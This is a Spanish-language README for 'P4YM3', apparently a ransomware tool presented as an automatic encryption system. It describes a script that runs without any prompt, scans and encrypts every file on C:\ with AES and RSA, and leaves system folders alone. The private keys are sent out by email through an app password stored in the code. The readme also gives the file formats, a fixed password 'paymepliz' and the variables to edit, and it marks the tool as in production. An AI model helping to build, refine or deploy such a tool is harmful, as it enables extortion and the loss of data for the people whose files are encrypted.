# Sistema de Cifrado Automático P4YM3 con Firma Digital

## 📋 Descripción

Este programa cifra automáticamente **todos los archivos del ordenador** con los siguientes features:

- ✅ **Ejecución automática**: No hay menú, se inicia directamente
- ✅ **Cifrado híbrido**: AES-256-CTR (simétrico) + RSA-3072-OAEP (asimétrico)
- ✅ **Firma digital**: RSA-PSS-SHA256 en todos los archivos cifrados
- ✅ **Dos claves distintas**: 
  - Clave PRINCIPAL: para la mayoría de archivos
  - Clave ESPECIAL: para 2 archivos seleccionados
- ✅ **Envío de claves**: Las claves se envían automáticamente al email especificado
- ✅ **Contraseña fija**: "paymepliz" para todas las operaciones
- ✅ **Formato P4YM3**: Encabezado con metadatos + datos cifrados

## 🚀 Uso

### Instalación de dependencias

```bash
pip install cryptography
```

### Ejecución

Simplemente ejecuta el script y se iniciará automáticamente:

```bash
python ram.py
```

### Proceso automático

1. **Generación de claves** (primera ejecución):
   - Genera par RSA principal (3072 bits)
   - Genera par RSA especial (3072 bits)
   - Solicita tu correo electrónico
   - Envía las 4 claves (.pem) por email

2. **Selección de archivos especiales**:
   - Solicita 2 archivos especiales (opcional)
   - Estos se cifrarán con la clave especial

3. **Cifrado automático**:
   - Escanea `C:\` recursivamente
   - Cifra todos los archivos con AES-256-CTR
   - Firma cada archivo con RSA-PSS-SHA256
   - Genera archivos `.p4ym3` y `.p4ym3.sig`

4. **Finalización**:
   - Muestra estadísticas del proceso
   - Se requiere presionar Enter para cerrar

## 📦 Formatos

### Archivo Cifrado (.p4ym3)
```
Línea 1: P4Y1|CTR|256|PKALG=RSA_OAEP_SHA256\n
Línea 2: <WRAPPED_KEY_BASE64>\n
Datos:   IV (16 bytes) + CIPHERTEXT
```

### Firma Digital (.p4ym3.sig)
```
Contenido: Base64(RSA-PSS-SHA256(archivo_cifrado))
```

## 🔒 Seguridad

- **RSA**: 3072 bits (OAEP + SHA256)
- **AES**: 256 bits en modo CTR
- **Firma**: PSS + SHA256 (máxima longitud de salt)
- **Envolvimiento de clave**: OAEP con MGFSHA256
- **Contraseña**: paymepliz
- **Email**: Utiliza contraseña de aplicación Gmail

## 📂 Exclusiones Automáticas

El programa NO cifra:
- Archivos del sistema (Windows, Program Files, etc.)
- Archivos muy grandes (> 500 MB)
- Directorios protegidos (System Volume Information, $Recycle.Bin)
- Archivos `.p4ym3`, `.sig`, `.pem`

## 📋 Claves generadas

Primera ejecución genera:
- `rsa_main_private.pem` - Clave privada principal (para descifrar mayoría)
- `rsa_main_public.pem` - Clave pública principal (para cifrar)
- `rsa_special_private.pem` - Clave privada especial (para descifrar 2 archivos)
- `rsa_special_public.pem` - Clave pública especial (para cifrar especiales)

Las claves se envían automáticamente a tu email.

## 💻 Variables de configuración

En el código puedes modificar:

```python
CONTRASENA_CIFRADO = "paymepliz"  # Contraseña para cifrado
# En función obtener_todos_archivos():
max_size_mb = 500  # Tamaño máximo de archivo
ruta_inicio = "C:\\"  # Ruta inicial de escaneo
```

## 🎯 Características

| Feature | Descripción |
|---------|-------------|
| **Ejecución automática** | No requiere menú, se inicia directamente |
| **Escaneo automático** | Recorre todos los directorios del ordenador |
| **Cifrado adaptativo** | CTR mode = sin padding, eficiente |
| **Firma verificable** | Cada archivo tiene su firma .sig |
| **Dos claves** | Principal (mayoría) + Especial (2 archivos) |
| **Email de claves** | Envía las 4 claves al email especificado |
| **Recuperable** | Todos los archivos pueden descifrarse |
| **Log de proceso** | Muestra progreso y errores |

## ⚙️ Configuración de Gmail

Para que funcione el envío de email:

1. Tener cuenta Gmail activa
2. Habilitar "Contraseñas de aplicación" en Google Account
3. La contraseña de aplicación está en el código

## 🔐 Descifrado (si es necesario)

Para descifrar un archivo `.p4ym3`:

1. Obtén las claves privadas (están en tu email)
2. El programa detecta qué clave usar automáticamente
3. Descifra el archivo en la carpeta del original

---

**Creado**: Diciembre 2025  
**Versión**: 2.0  
**Estado**: Producción
